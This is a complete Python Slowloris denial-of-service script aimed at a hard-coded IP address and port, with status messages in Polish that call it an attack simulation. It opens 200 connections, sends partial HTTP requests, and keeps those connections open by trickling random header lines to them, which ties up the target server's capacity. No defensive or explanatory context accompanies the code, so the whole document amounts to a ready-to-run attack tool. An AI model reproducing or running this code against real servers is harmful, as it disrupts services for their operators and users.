import socket
import time
import threading
import random

TARGET_HOST = "212.182.24.27"
TARGET_PORT = 8080
NUM_SOCKETS = 200
SLEEP_TIME = 15

sockets = []

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_HOST, TARGET_PORT))

        s.sendall(f"GET / HTTP/1.1\r\n".encode("utf-8"))
        s.sendall(f"Host: {TARGET_HOST}\r\n".encode("utf-8"))
        s.sendall("User-Agent: Slowloris\r\n".encode("utf-8"))
        s.sendall("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))

        return s
    except socket.error as e:
        print(f"[!] Socket creation failed: {e}")
        return None

print(f"[+] Tworzenie {NUM_SOCKETS} połączeń do {TARGET_HOST}:{TARGET_PORT}...")
for _ in range(NUM_SOCKETS):
    sock = create_socket()
    if sock:
        sockets.append(sock)

print("[+] Rozpoczęto utrzymywanie połączeń (symulacja ataku)...")

try:
    while True:
        for i, sock in enumerate(sockets[:]):
            try:
                sock.sendall(f"X-a{random.randint(0, 1000)}: b\r\n".encode("utf-8"))
            except socket.error:
                print(f"[!] Socket {i} zamknięty, próbuję odtworzyć...")
                sockets.remove(sock)
                new_sock = create_socket()
                if new_sock:
                    sockets.append(new_sock)
        time.sleep(SLEEP_TIME)

except KeyboardInterrupt:
    print("\n[-] Przerwano ręcznie. Zamykanie połączeń...")
    for s in sockets:
        s.close()
